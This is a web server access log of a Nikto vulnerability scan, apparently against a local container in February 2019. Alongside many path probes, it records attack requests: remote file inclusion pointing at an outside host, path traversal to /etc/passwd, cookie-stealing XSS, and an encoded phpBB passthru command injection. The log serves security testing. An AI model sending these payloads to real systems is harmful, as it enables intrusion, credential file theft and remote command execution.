172.17.0.1 - - [12/Feb/2019:08:08:27 +0000] "GET /level/23/exec//show HTTP/1.1" 404 510 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:001270)"
172.17.0.1 - - [12/Feb/2019:08:08:27 +0000] "GET /level/24/exec//show HTTP/1.1" 404 510 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:001271)"
172.17.0.1 - - [12/Feb/2019:08:08:27 +0000] "GET /level/25/exec//show HTTP/1.1" 404 510 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:001272)"
172.17.0.1 - - [12/Feb/2019:08:08:27 +0000] "GET /level/26/exec//show HTTP/1.1" 404 510 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:001273)"
172.17.0.1 - - [12/Feb/2019:08:08:27 +0000] "GET /level/27/exec//show HTTP/1.1" 404 510 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:001274)"
172.17.0.1 - - [12/Feb/2019:08:08:27 +0000] "GET /level/28/exec//show HTTP/1.1" 404 510 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:001275)"
172.17.0.1 - - [12/Feb/2019:08:08:27 +0000] "GET /level/29/exec//show HTTP/1.1" 404 510 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:001276)"
172.17.0.1 - - [12/Feb/2019:08:08:27 +0000] "GET /level/30/exec//show HTTP/1.1" 404 510 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:001277)"
172.17.0.1 - - [12/Feb/2019:08:08:27 +0000] "GET /level/31/exec//show HTTP/1.1" 404 510 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:001278)"
172.17.0.1 - - [12/Feb/2019:08:08:27 +0000] "GET /level/32/exec//show HTTP/1.1" 404 510 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:001279)"
172.17.0.1 - - [12/Feb/2019:08:08:27 +0000] "GET /level/33/exec//show HTTP/1.1" 404 510 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:001280)"
172.17.0.1 - - [12/Feb/2019:08:08:27 +0000] "GET /level/34/exec//show HTTP/1.1" 404 510 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:001281)"
172.17.0.1 - - [12/Feb/2019:08:08:27 +0000] "GET /level/35/exec//show HTTP/1.1" 404 510 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:001282)"
172.17.0.1 - - [12/Feb/2019:08:08:27 +0000] "GET /level/36/exec//show HTTP/1.1" 404 510 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:001283)"
172.17.0.1 - - [12/Feb/2019:08:08:27 +0000] "GET /level/37/exec//show HTTP/1.1" 404 510 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:001284)"
172.17.0.1 - - [12/Feb/2019:08:08:27 +0000] "GET /level/38/exec//show HTTP/1.1" 404 510 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:001285)"
172.17.0.1 - - [12/Feb/2019:08:08:27 +0000] "GET /level/39/exec//show HTTP/1.1" 404 510 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:001286)"
172.17.0.1 - - [12/Feb/2019:08:08:27 +0000] "GET /level/40/exec//show HTTP/1.1" 404 510 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:001287)"
172.17.0.1 - - [12/Feb/2019:08:08:27 +0000] "GET /level/41/exec//show HTTP/1.1" 404 510 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:001288)"
172.17.0.1 - - [12/Feb/2019:08:08:27 +0000] "GET /level/42/exec//show HTTP/1.1" 404 510 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:001289)"
172.17.0.1 - - [12/Feb/2019:08:08:27 +0000] "GET /level/43/exec//show HTTP/1.1" 404 510 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:001290)"
172.17.0.1 - - [12/Feb/2019:08:08:27 +0000] "GET /level/44/exec//show HTTP/1.1" 404 510 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:001291)"
172.17.0.1 - - [12/Feb/2019:08:08:27 +0000] "GET /level/45/exec//show HTTP/1.1" 404 510 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:001292)"
172.17.0.1 - - [12/Feb/2019:08:08:27 +0000] "GET /level/46/exec//show HTTP/1.1" 404 510 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:001293)"
172.17.0.1 - - [12/Feb/2019:08:08:27 +0000] "GET /level/47/exec//show HTTP/1.1" 404 510 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:001294)"
172.17.0.1 - - [12/Feb/2019:08:08:27 +0000] "GET /level/48/exec//show HTTP/1.1" 404 510 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:001295)"
172.17.0.1 - - [12/Feb/2019:08:08:27 +0000] "GET /level/49/exec//show HTTP/1.1" 404 510 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:001296)"
172.17.0.1 - - [12/Feb/2019:08:08:27 +0000] "GET /level/50/exec//show HTTP/1.1" 404 510 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:001297)"
172.17.0.1 - - [12/Feb/2019:08:08:27 +0000] "GET /level/51/exec//show HTTP/1.1" 404 510 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:001298)"
172.17.0.1 - - [12/Feb/2019:08:08:27 +0000] "GET /level/52/exec//show HTTP/1.1" 404 510 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:001299)"
172.17.0.1 - - [12/Feb/2019:08:08:27 +0000] "GET /level/53/exec//show HTTP/1.1" 404 510 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:001300)"
172.17.0.1 - - [12/Feb/2019:08:08:27 +0000] "GET /level/54/exec//show HTTP/1.1" 404 510 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:001301)"
172.17.0.1 - - [12/Feb/2019:08:08:27 +0000] "GET /level/55/exec//show HTTP/1.1" 404 510 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:001302)"
172.17.0.1 - - [12/Feb/2019:08:08:27 +0000] "GET /level/56/exec//show HTTP/1.1" 404 510 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:001303)"
172.17.0.1 - - [12/Feb/2019:08:08:27 +0000] "GET /level/57/exec//show HTTP/1.1" 404 510 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:001304)"
172.17.0.1 - - [12/Feb/2019:08:08:27 +0000] "GET /level/58/exec//show HTTP/1.1" 404 510 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:001305)"
172.17.0.1 - - [12/Feb/2019:08:08:27 +0000] "GET /level/59/exec//show HTTP/1.1" 404 510 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:001306)"
172.17.0.1 - - [12/Feb/2019:08:08:27 +0000] "GET /level/60/exec//show HTTP/1.1" 404 510 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:001307)"
172.17.0.1 - - [12/Feb/2019:08:08:27 +0000] "GET /level/61/exec//show HTTP/1.1" 404 510 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:001308)"
172.17.0.1 - - [12/Feb/2019:08:08:27 +0000] "GET /level/62/exec//show HTTP/1.1" 404 510 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:001309)"
172.17.0.1 - - [12/Feb/2019:08:08:27 +0000] "GET /level/63/exec//show HTTP/1.1" 404 510 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:001310)"
172.17.0.1 - - [12/Feb/2019:08:08:27 +0000] "GET /level/64/exec//show HTTP/1.1" 404 510 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:001311)"
172.17.0.1 - - [12/Feb/2019:08:08:27 +0000] "GET /level/65/exec//show HTTP/1.1" 404 510 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:001312)"
172.17.0.1 - - [12/Feb/2019:08:08:27 +0000] "GET /level/66/exec//show HTTP/1.1" 404 510 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:001313)"
172.17.0.1 - - [12/Feb/2019:08:08:27 +0000] "GET /level/67/exec//show HTTP/1.1" 404 510 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:001314)"
172.17.0.1 - - [12/Feb/2019:08:08:27 +0000] "GET /level/68/exec//show HTTP/1.1" 404 510 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:001315)"
172.17.0.1 - - [12/Feb/2019:08:08:27 +0000] "GET /level/69/exec//show HTTP/1.1" 404 510 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:001316)"
172.17.0.1 - - [12/Feb/2019:08:08:27 +0000] "GET /level/70/exec//show HTTP/1.1" 404 510 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:001317)"
172.17.0.1 - - [12/Feb/2019:08:08:27 +0000] "GET /level/71/exec//show HTTP/1.1" 404 510 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:001318)"
172.17.0.1 - - [12/Feb/2019:08:08:27 +0000] "GET /level/72/exec//show HTTP/1.1" 404 510 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:001319)"
172.17.0.1 - - [12/Feb/2019:08:08:27 +0000] "GET /level/73/exec//show HTTP/1.1" 404 510 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:001320)"
172.17.0.1 - - [12/Feb/2019:08:08:27 +0000] "GET /level/74/exec//show HTTP/1.1" 404 510 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:001321)"
172.17.0.1 - - [12/Feb/2019:08:08:27 +0000] "GET /level/75/exec//show HTTP/1.1" 404 510 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:001322)"
172.17.0.1 - - [12/Feb/2019:08:08:27 +0000] "GET /level/76/exec//show HTTP/1.1" 404 510 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:001323)"
172.17.0.1 - - [12/Feb/2019:08:08:27 +0000] "GET /level/77/exec//show HTTP/1.1" 404 510 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:001324)"
172.17.0.1 - - [12/Feb/2019:08:08:27 +0000] "GET /level/78/exec//show HTTP/1.1" 404 510 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:001325)"
172.17.0.1 - - [12/Feb/2019:08:08:27 +0000] "GET /level/79/exec//show HTTP/1.1" 404 510 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:001326)"
172.17.0.1 - - [12/Feb/2019:08:08:27 +0000] "GET /level/80/exec//show HTTP/1.1" 404 510 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:001327)"
172.17.0.1 - - [12/Feb/2019:08:08:27 +0000] "GET /level/81/exec//show HTTP/1.1" 404 510 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:001328)"
172.17.0.1 - - [12/Feb/2019:08:08:27 +0000] "GET /level/82/exec//show HTTP/1.1" 404 510 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:001329)"
172.17.0.1 - - [12/Feb/2019:08:08:27 +0000] "GET /level/83/exec//show HTTP/1.1" 404 510 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:001330)"
172.17.0.1 - - [12/Feb/2019:08:08:27 +0000] "GET /level/84/exec//show HTTP/1.1" 404 510 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:001331)"
172.17.0.1 - - [12/Feb/2019:08:08:27 +0000] "GET /level/85/exec//show HTTP/1.1" 404 510 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:001332)"
172.17.0.1 - - [12/Feb/2019:08:08:27 +0000] "GET /level/86/exec//show HTTP/1.1" 404 510 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:001333)"
172.17.0.1 - - [12/Feb/2019:08:08:27 +0000] "GET /level/87/exec//show HTTP/1.1" 404 510 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:001334)"
172.17.0.1 - - [12/Feb/2019:08:08:27 +0000] "GET /level/88/exec//show HTTP/1.1" 404 510 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:001335)"
172.17.0.1 - - [12/Feb/2019:08:08:27 +0000] "GET /level/89/exec//show HTTP/1.1" 404 510 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:001336)"
172.17.0.1 - - [12/Feb/2019:08:08:27 +0000] "GET /level/90/exec//show HTTP/1.1" 404 510 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:001337)"
172.17.0.1 - - [12/Feb/2019:08:08:27 +0000] "GET /level/91/exec//show HTTP/1.1" 404 510 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:001338)"
172.17.0.1 - - [12/Feb/2019:08:08:27 +0000] "GET /level/92/exec//show HTTP/1.1" 404 510 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:001339)"
172.17.0.1 - - [12/Feb/2019:08:08:27 +0000] "GET /level/93/exec//show HTTP/1.1" 404 510 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:001340)"
172.17.0.1 - - [12/Feb/2019:08:08:27 +0000] "GET /level/94/exec//show HTTP/1.1" 404 510 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:001341)"
172.17.0.1 - - [12/Feb/2019:08:08:27 +0000] "GET /level/95/exec//show HTTP/1.1" 404 510 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:001342)"
172.17.0.1 - - [12/Feb/2019:08:08:27 +0000] "GET /level/96/exec//show HTTP/1.1" 404 510 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:001343)"
172.17.0.1 - - [12/Feb/2019:08:08:27 +0000] "GET /level/97/exec//show HTTP/1.1" 404 509 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:001344)"
172.17.0.1 - - [12/Feb/2019:08:08:27 +0000] "GET /level/98/exec//show HTTP/1.1" 404 509 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:001345)"
172.17.0.1 - - [12/Feb/2019:08:08:27 +0000] "GET /level/99/exec//show HTTP/1.1" 404 509 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:001346)"
172.17.0.1 - - [12/Feb/2019:08:08:27 +0000] "GET /gallery/captionator.php?GALLERY_BASEDIR=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 513 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:001347)"
172.17.0.1 - - [12/Feb/2019:08:08:27 +0000] "GET /gallery/errors/configmode.php?GALLERY_BASEDIR=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 519 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:001348)"
172.17.0.1 - - [12/Feb/2019:08:08:27 +0000] "GET /gallery/errors/reconfigure.php?GALLERY_BASEDIR=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 520 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:001350)"
172.17.0.1 - - [12/Feb/2019:08:08:27 +0000] "GET /gallery/errors/unconfigured.php?GALLERY_BASEDIR=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 521 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:001351)"
172.17.0.1 - - [12/Feb/2019:08:08:27 +0000] "GET /users.lst HTTP/1.1" 404 499 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:001352)"
172.17.0.1 - - [12/Feb/2019:08:08:27 +0000] "GET /WS_FTP.LOG HTTP/1.1" 404 500 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:001353)"
172.17.0.1 - - [12/Feb/2019:08:08:27 +0000] "GET /basilix.php3?request_id[DUMMY]=../../../../etc/passwd&RequestID=DUMMY&username=sec&password=secu HTTP/1.1" 404 467 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:001354)"
172.17.0.1 - - [12/Feb/2019:08:08:27 +0000] "GET /examples/jsp/snp/snoop.jsp HTTP/1.1" 404 518 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:001355)"
172.17.0.1 - - [12/Feb/2019:08:08:27 +0000] "GET /nsn/env.bas HTTP/1.1" 404 502 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:001356)"
172.17.0.1 - - [12/Feb/2019:08:08:27 +0000] "GET /lcgi/lcgitest.nlm HTTP/1.1" 404 508 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:001357)"
172.17.0.1 - - [12/Feb/2019:08:08:27 +0000] "GET /com/ HTTP/1.1" 404 495 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:001358)"
172.17.0.1 - - [12/Feb/2019:08:08:27 +0000] "GET /com/novell/ HTTP/1.1" 404 502 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:001359)"
172.17.0.1 - - [12/Feb/2019:08:08:27 +0000] "GET /com/novell/webaccess HTTP/1.1" 404 511 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:001360)"
172.17.0.1 - - [12/Feb/2019:08:08:27 +0000] "GET /index.php?module=ew_filemanager&type=admin&func=manager&pathext=../../../etc HTTP/1.1" 302 478 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:001362)"
172.17.0.1 - - [12/Feb/2019:08:08:27 +0000] "GET /index.php?module=ew_filemanager&type=admin&func=manager&pathext=../../../etc/&view=passwd HTTP/1.1" 302 478 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:001363)"
172.17.0.1 - - [12/Feb/2019:08:08:27 +0000] "GET //admin/admin.shtml HTTP/1.1" 404 508 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:001373)"
172.17.0.1 - - [12/Feb/2019:08:08:27 +0000] "GET /axis-cgi/buffer/command.cgi HTTP/1.1" 404 518 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:001374)"
172.17.0.1 - - [12/Feb/2019:08:08:27 +0000] "GET /support/messages HTTP/1.1" 404 507 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:001375)"
172.17.0.1 - - [12/Feb/2019:08:08:27 +0000] "GET /index.php?err=3&email=\\\"><script>alert(document.cookie)</script> HTTP/1.1" 302 478 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:001378)"
172.17.0.1 - - [12/Feb/2019:08:08:27 +0000] "GET /forgot_password.php?email=\\\"><script>alert(document.cookie)</script> HTTP/1.1" 404 510 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:001379)"
172.17.0.1 - - [12/Feb/2019:08:08:27 +0000] "GET /bugs/index.php?err=3&email=\\\"><script>alert(document.cookie)</script> HTTP/1.1" 404 505 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:001380)"
172.17.0.1 - - [12/Feb/2019:08:08:27 +0000] "GET /bugs/forgot_password.php?email=\\\"><script>alert(document.cookie)</script> HTTP/1.1" 404 515 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:001381)"
172.17.0.1 - - [12/Feb/2019:08:08:27 +0000] "GET /eventum/index.php?err=3&email=\\\"><script>alert(document.cookie)</script> HTTP/1.1" 404 508 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:001382)"
172.17.0.1 - - [12/Feb/2019:08:08:27 +0000] "GET /eventum/forgot_password.php?email=\\\"><script>alert(document.cookie)</script> HTTP/1.1" 404 518 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:001383)"
172.17.0.1 - - [12/Feb/2019:08:08:27 +0000] "GET /index.php?=PHPB8B5F2A0-3C92-11d3-A3A9-4C7B08C10000 HTTP/1.1" 302 478 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:001384)"
172.17.0.1 - - [12/Feb/2019:08:08:27 +0000] "GET /some.php?=PHPE9568F36-D428-11d2-A769-00AA001ACF42 HTTP/1.1" 404 499 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:001385)"
172.17.0.1 - - [12/Feb/2019:08:08:27 +0000] "GET /some.php?=PHPE9568F34-D428-11d2-A769-00AA001ACF42 HTTP/1.1" 404 499 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:001386)"
172.17.0.1 - - [12/Feb/2019:08:08:27 +0000] "GET /some.php?=PHPE9568F35-D428-11d2-A769-00AA001ACF42 HTTP/1.1" 404 499 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:001387)"
172.17.0.1 - - [12/Feb/2019:08:08:27 +0000] "GET /index.php?name=Forums&file=viewtopic&t=2&rush=%64%69%72&highlight=%2527.%70%61%73%73%74%68%72%75%28%24%48%54%54%50%5f%47%45%54%5f%56%41%52%53%5b%72%75%73%68%5d%29.%2527 HTTP/1.1" 302 478 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:001388)"
172.17.0.1 - - [12/Feb/2019:08:08:27 +0000] "GET /viewtopic.php?t=2&rush=%64%69%72&highlight=%2527.%70%61%73%73%74%68%72%75%28%24%48%54%54%50%5f%47%45%54%5f%56%41%52%53%5b%72%75%73%68%5d%29.%2527 HTTP/1.1" 404 504 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:001389)"
172.17.0.1 - - [12/Feb/2019:08:08:27 +0000] "GET /index.php?Nikto=Forums&file=viewtopic&t=2&rush=%64%69%72&highlight=%2527.%70%61%73%73%74%68%72%75%28%24%48%54%54%50%5f%47%45%54%5f%56%41%52%53%5b%72%75%73%68%5d%29.%2527 HTTP/1.1" 302 478 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:001390)"
172.17.0.1 - - [12/Feb/2019:08:08:27 +0000] "GET /postnuke/index.php?Nikto=Forums&file=viewtopic&t=2&rush=%64%69%72&highlight=%2527.%70%61%73%73%74%68%72%75%28%24%48%54%54%50%5f%47%45%54%5f%56%41%52%53%5b%72%75%73%68%5d%29.%2527 HTTP/1.1" 404 509 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:001390)"
172.17.0.1 - - [12/Feb/2019:08:08:27 +0000] "GET /postnuke/html/index.php?Nikto=Forums&file=viewtopic&t=2&rush=%64%69%72&highlight=%2527.%70%61%73%73%74%68%72%75%28%24%48%54%54%50%5f%47%45%54%5f%56%41%52%53%5b%72%75%73%68%5d%29.%2527 HTTP/1.1" 404 514 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:001390)"
172.17.0.1 - - [12/Feb/2019:08:08:27 +0000] "GET /modules/index.php?Nikto=Forums&file=viewtopic&t=2&rush=%64%69%72&highlight=%2527.%70%61%73%73%74%68%72%75%28%24%48%54%54%50%5f%47%45%54%5f%56%41%52%53%5b%72%75%73%68%5d%29.%2527 HTTP/1.1" 404 508 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:001390)"
172.17.0.1 - - [12/Feb/2019:08:08:27 +0000] "GET /phpBB/index.php?Nikto=Forums&file=viewtopic&t=2&rush=%64%69%72&highlight=%2527.%70%61%73%73%74%68%72%75%28%24%48%54%54%50%5f%47%45%54%5f%56%41%52%53%5b%72%75%73%68%5d%29.%2527 HTTP/1.1" 404 506 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:001390)"
172.17.0.1 - - [12/Feb/2019:08:08:27 +0000] "GET /forum/index.php?Nikto=Forums&file=viewtopic&t=2&rush=%64%69%72&highlight=%2527.%70%61%73%73%74%68%72%75%28%24%48%54%54%50%5f%47%45%54%5f%56%41%52%53%5b%72%75%73%68%5d%29.%2527 HTTP/1.1" 404 506 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:001390)"
172.17.0.1 - - [12/Feb/2019:08:08:27 +0000] "GET /index.php?name=Forums&file=viewtopic&t=2&rush=%64%69%72&highlight=%2527.%70%61%73%73%74%68%72%75%28%24%48%54%54%50%5f%47%45%54%5f%56%41%52%53%5b%72%75%73%68%5d%29.%2527 HTTP/1.1" 302 478 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:001390)"
172.17.0.1 - - [12/Feb/2019:08:08:27 +0000] "GET /postnuke/index.php?name=Forums&file=viewtopic&t=2&rush=%64%69%72&highlight=%2527.%70%61%73%73%74%68%72%75%28%24%48%54%54%50%5f%47%45%54%5f%56%41%52%53%5b%72%75%73%68%5d%29.%2527 HTTP/1.1" 404 509 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:001390)"
172.17.0.1 - - [12/Feb/2019:08:08:27 +0000] "GET /postnuke/html/index.php?name=Forums&file=viewtopic&t=2&rush=%64%69%72&highlight=%2527.%70%61%73%73%74%68%72%75%28%24%48%54%54%50%5f%47%45%54%5f%56%41%52%53%5b%72%75%73%68%5d%29.%2527 HTTP/1.1" 404 514 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:001390)"
172.17.0.1 - - [12/Feb/2019:08:08:27 +0000] "GET /modules/index.php?name=Forums&file=viewtopic&t=2&rush=%64%69%72&highlight=%2527.%70%61%73%73%74%68%72%75%28%24%48%54%54%50%5f%47%45%54%5f%56%41%52%53%5b%72%75%73%68%5d%29.%2527 HTTP/1.1" 404 508 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:001390)"
172.17.0.1 - - [12/Feb/2019:08:08:27 +0000] "GET /phpBB/index.php?name=Forums&file=viewtopic&t=2&rush=%64%69%72&highlight=%2527.%70%61%73%73%74%68%72%75%28%24%48%54%54%50%5f%47%45%54%5f%56%41%52%53%5b%72%75%73%68%5d%29.%2527 HTTP/1.1" 404 506 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:001390)"
172.17.0.1 - - [12/Feb/2019:08:08:27 +0000] "GET /forum/index.php?name=Forums&file=viewtopic&t=2&rush=%64%69%72&highlight=%2527.%70%61%73%73%74%68%72%75%28%24%48%54%54%50%5f%47%45%54%5f%56%41%52%53%5b%72%75%73%68%5d%29.%2527 HTTP/1.1" 404 506 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:001390)"
172.17.0.1 - - [12/Feb/2019:08:08:27 +0000] "GET /index.php?Nikto=forums&file=viewtopic&t=2&rush=%64%69%72&highlight=%2527.%70%61%73%73%74%68%72%75%28%24%48%54%54%50%5f%47%45%54%5f%56%41%52%53%5b%72%75%73%68%5d%29.%2527 HTTP/1.1" 302 478 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:001391)"
172.17.0.1 - - [12/Feb/2019:08:08:27 +0000] "GET /postnuke/index.php?Nikto=forums&file=viewtopic&t=2&rush=%64%69%72&highlight=%2527.%70%61%73%73%74%68%72%75%28%24%48%54%54%50%5f%47%45%54%5f%56%41%52%53%5b%72%75%73%68%5d%29.%2527 HTTP/1.1" 404 509 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:001391)"
172.17.0.1 - - [12/Feb/2019:08:08:27 +0000] "GET /postnuke/html/index.php?Nikto=forums&file=viewtopic&t=2&rush=%64%69%72&highlight=%2527.%70%61%73%73%74%68%72%75%28%24%48%54%54%50%5f%47%45%54%5f%56%41%52%53%5b%72%75%73%68%5d%29.%2527 HTTP/1.1" 404 514 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:001391)"
172.17.0.1 - - [12/Feb/2019:08:08:27 +0000] "GET /modules/index.php?Nikto=forums&file=viewtopic&t=2&rush=%64%69%72&highlight=%2527.%70%61%73%73%74%68%72%75%28%24%48%54%54%50%5f%47%45%54%5f%56%41%52%53%5b%72%75%73%68%5d%29.%2527 HTTP/1.1" 404 508 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:001391)"
172.17.0.1 - - [12/Feb/2019:08:08:27 +0000] "GET /phpBB/index.php?Nikto=forums&file=viewtopic&t=2&rush=%64%69%72&highlight=%2527.%70%61%73%73%74%68%72%75%28%24%48%54%54%50%5f%47%45%54%5f%56%41%52%53%5b%72%75%73%68%5d%29.%2527 HTTP/1.1" 404 506 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:001391)"
172.17.0.1 - - [12/Feb/2019:08:08:27 +0000] "GET /forum/index.php?Nikto=forums&file=viewtopic&t=2&rush=%64%69%72&highlight=%2527.%70%61%73%73%74%68%72%75%28%24%48%54%54%50%5f%47%45%54%5f%56%41%52%53%5b%72%75%73%68%5d%29.%2527 HTTP/1.1" 404 506 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:001391)"
